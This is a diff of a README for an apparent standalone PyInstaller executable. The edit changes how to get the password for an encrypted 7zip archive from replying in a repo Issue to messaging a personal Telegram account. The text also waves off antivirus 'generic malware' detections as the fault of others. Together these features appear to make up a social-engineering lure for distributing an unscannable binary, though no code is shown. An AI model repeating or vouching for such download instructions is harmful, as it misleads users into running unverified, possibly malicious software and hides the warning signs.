@@ -7,6 +7,6 @@ The tool can be used from terminal without any distro of Python installed locall
 To start the GUI mode, run on terminal Pyinstaller.exe -GUI
 To run the Command mode, run on terminal Pyinstaller.exe --onefile yourfile.py. By typing Pyinstaller.exe --help, you will get a verbose output of all commands, including UPX, custom icon and UAC-admin template.
 
-The file is stored in a .zip archive made with 7zip. To extract you need 7z or WinRar, otherwise it crashes. To retrieve password, reply to this repo on "Issue", to gain visibility and popularity. Also forking the project would be a good idea.
+The file is stored in a .zip archive made with 7zip. To extract you need 7z or WinRar, otherwise it crashes. To retrieve password, reply on my Telegram: @crazy_coder1996
 
 *Please note, some very stupid idiots used Pyinstaller to compile virus, resulting in the app being flagged as generic malware, test it on a virtual machine if you don't trust the repository*
